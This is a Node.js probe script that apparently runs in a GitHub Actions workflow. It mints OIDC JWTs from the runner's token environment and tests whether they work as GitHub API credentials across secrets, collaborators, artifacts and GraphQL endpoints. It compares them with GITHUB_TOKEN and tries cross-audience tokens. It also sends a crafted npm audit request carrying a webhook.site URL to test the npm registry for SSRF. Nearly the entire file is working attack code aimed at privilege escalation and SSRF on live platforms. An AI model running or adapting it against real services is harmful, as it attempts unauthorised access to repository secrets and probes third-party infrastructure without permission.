const https = require('https');

const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_REPOSITORY_ID = process.env.GITHUB_REPOSITORY_ID || '';
const GITHUB_ACTOR = process.env.GITHUB_ACTOR || '';
const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
const RUN_NUMBER = process.env.GITHUB_RUN_NUMBER || '';

function apiGet(hostname, path, auth) {
  return new Promise((resolve) => {
    const r = https.request({ hostname, path, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + auth, 'User-Agent': 'GitHub-Actions-Probe', 'Accept': 'application/vnd.github.v3+json' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

function oidcGet(hostname, path, token, extraHeaders) {
  return new Promise((resolve) => {
    const r = https.request({ hostname, path, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + token, ...(extraHeaders || {}) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

async function getOidcJwt(audience) {
  const oidcParsed = new URL(OIDC_URL);
  const path = oidcParsed.pathname + oidcParsed.search + '&audience=' + encodeURIComponent(audience);
  const r = await oidcGet(oidcParsed.hostname, path, OIDC_TOKEN);
  if (r.status === 200) {
    try { return JSON.parse(r.body).value; } catch(e) { return null; }
  }
  return null;
}

async function main() {
  if (!OIDC_URL || !OIDC_TOKEN || !GITHUB_TOKEN) { console.log('Missing env'); return; }
  console.log('=== V18: OIDC JWT as GitHub API Auth + npm Audit SSRF + Scope Elevation ===');
  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID, '| Actor:', GITHUB_ACTOR);

  // === PART 1: Get OIDC JWT for api.github.com ===
  console.log('\n=== PART 1: Get OIDC JWT for api.github.com audience ===');
  const oidcJwt = await getOidcJwt('api.github.com');
  if (!oidcJwt) { console.log('Failed to get OIDC JWT'); return; }
  const oidcPayload = JSON.parse(Buffer.from(oidcJwt.split('.')[1], 'base64url').toString());
  console.log('OIDC JWT obtained | aud:', oidcPayload.aud, '| sub:', oidcPayload.sub, '| exp:', new Date(oidcPayload.exp * 1000).toISOString());

  // === PART 2: Try OIDC JWT as GitHub API auth ===
  console.log('\n=== PART 2: OIDC JWT as GitHub API Bearer token ===');
  const endpoints = [
    '/user',                                          // Who am I?
    '/user/repos?per_page=1',                         // List my repos?
    '/repos/' + GITHUB_REPOSITORY,                    // My own repo
    '/repos/' + GITHUB_REPOSITORY + '/actions/secrets', // Our own secrets (need admin)
    '/repos/' + GITHUB_REPOSITORY + '/actions/variables', // Variables
    '/orgs/' + GITHUB_ACTOR + '/members?per_page=1',  // Org members
    '/repos/github/docs',                             // Third-party public repo
    '/repos/github/docs/contents/README.md',          // Third-party content
  ];

  for (const ep of endpoints) {
    const withOidc = await apiGet('api.github.com', ep, oidcJwt);
    const withGithub = await apiGet('api.github.com', ep, GITHUB_TOKEN);
    const oidcBody = withOidc.body.substring(0, 80);
    const githubBody = withGithub.body.substring(0, 80);
    if (withOidc.status !== withGithub.status) {
      console.log('!!! DIFF ' + ep + ': OIDC=' + withOidc.status + ' vs GH_TOKEN=' + withGithub.status);
      console.log('    OIDC body:', oidcBody);
      console.log('    GH_TOKEN body:', githubBody);
    } else {
      console.log('[OIDC_API] ' + ep + ': status=' + withOidc.status + ' | oidc_body=' + oidcBody.substring(0, 60));
    }
  }

  // === PART 3: Try OIDC JWT to access secrets API (should be blocked) ===
  console.log('\n=== PART 3: OIDC JWT scope elevation test ===');
  // GITHUB_TOKEN with id-token: write, contents: read, metadata: read
  // Can OIDC JWT access secrets (would require secrets: read)?
  const secretsEndpoints = [
    '/repos/' + GITHUB_REPOSITORY + '/actions/secrets',
    '/orgs/' + GITHUB_ACTOR + '/actions/secrets',
    '/repos/' + GITHUB_REPOSITORY + '/environments',
    '/repos/' + GITHUB_REPOSITORY + '/deployments',
    '/repos/' + GITHUB_REPOSITORY + '/collaborators',
  ];
  for (const ep of secretsEndpoints) {
    const withOidc = await apiGet('api.github.com', ep, oidcJwt);
    const withGithub = await apiGet('api.github.com', ep, GITHUB_TOKEN);
    const diff = withOidc.status !== withGithub.status ? ' !!!DIFF!!!' : '';
    console.log('[SCOPE] ' + ep.split('/').slice(-2).join('/') + ': OIDC=' + withOidc.status + ' GH=' + withGithub.status + diff);
    if (diff) {
      console.log('  OIDC:', withOidc.body.substring(0, 100));
      console.log('  GH_TOKEN:', withGithub.body.substring(0, 100));
    }
  }

  // === PART 4: OIDC JWT for wrong audience used against GH API ===
  console.log('\n=== PART 4: Cross-audience OIDC JWT test ===');
  const audiences = ['sts.amazonaws.com', 'api.github.com', 'management.azure.com'];
  for (const aud of audiences) {
    const jwt = await getOidcJwt(aud);
    if (!jwt) { console.log('[XAUD] ' + aud + ': JWT fetch failed'); continue; }
    const p = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
    const r = await apiGet('api.github.com', '/user', jwt);
    console.log('[XAUD] aud=' + aud + ': JWT_aud=' + JSON.stringify(p.aud) + ' → API /user: ' + r.status + ' | ' + r.body.substring(0, 60));
  }

  // === PART 5: npm audit endpoint SSRF test from runner ===
  console.log('\n=== PART 5: npm audit endpoint SSRF ===');
  // npm audit sends POST to /-/npm/v1/security/audits/quick
  // The body is a package-lock.json structure. Is there SSRF in any fetched URL?
  const npmAuditPayload = JSON.stringify({
    name: 'test',
    version: '1.0.0',
    requires: {},
    dependencies: {
      'test-pkg': {
        version: '1.0.0',
        resolved: 'https://webhook.site/ssrf-test',  // SSRF test URL
        integrity: 'sha512-abc',
        requires: {}
      }
    }
  });

  const npmAuditReq = new Promise((resolve) => {
    const buf = Buffer.from(npmAuditPayload);
    const r = https.request({
      hostname: 'registry.npmjs.org', path: '/-/npm/v1/security/audits/quick',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': buf.length }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 300) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(buf); r.end();
  });
  const npmAuditResult = await npmAuditReq;
  console.log('[NPM_AUDIT] POST /-/npm/v1/security/audits/quick:', npmAuditResult.status, '|', npmAuditResult.body.substring(0, 200));

  // === PART 6: Check if current run's artifacts are accessible from different repo ===
  console.log('\n=== PART 6: Current run context info ===');
  // Get the current run's artifact listing using OIDC JWT vs GITHUB_TOKEN
  const artifactPath = '/repos/' + GITHUB_REPOSITORY + '/actions/runs/' + GITHUB_RUN_ID + '/artifacts';
  const artOidc = await apiGet('api.github.com', artifactPath, oidcJwt);
  const artGH = await apiGet('api.github.com', artifactPath, GITHUB_TOKEN);
  console.log('[ARTIFACT] OIDC auth → run artifacts:', artOidc.status, '|', artOidc.body.substring(0, 100));
  console.log('[ARTIFACT] GH_TOKEN auth → run artifacts:', artGH.status, '|', artGH.body.substring(0, 100));

  // === PART 7: GraphQL with OIDC JWT ===
  console.log('\n=== PART 7: GraphQL with OIDC JWT ===');
  const gqlQuery = JSON.stringify({ query: '{ viewer { login } }' });
  const gqlReq = (auth) => new Promise((resolve) => {
    const buf = Buffer.from(gqlQuery);
    const r = https.request({
      hostname: 'api.github.com', path: '/graphql', method: 'POST',
      headers: { 'Authorization': 'Bearer ' + auth, 'Content-Type': 'application/json', 'Content-Length': buf.length, 'User-Agent': 'GitHub-Actions-Probe' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(buf); r.end();
  });
  const gqlOidc = await gqlReq(oidcJwt);
  const gqlGH = await gqlReq(GITHUB_TOKEN);
  console.log('[GQL] OIDC JWT viewer.login:', gqlOidc.status, '|', gqlOidc.body.substring(0, 100));
  console.log('[GQL] GH_TOKEN viewer.login:', gqlGH.status, '|', gqlGH.body.substring(0, 100));

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
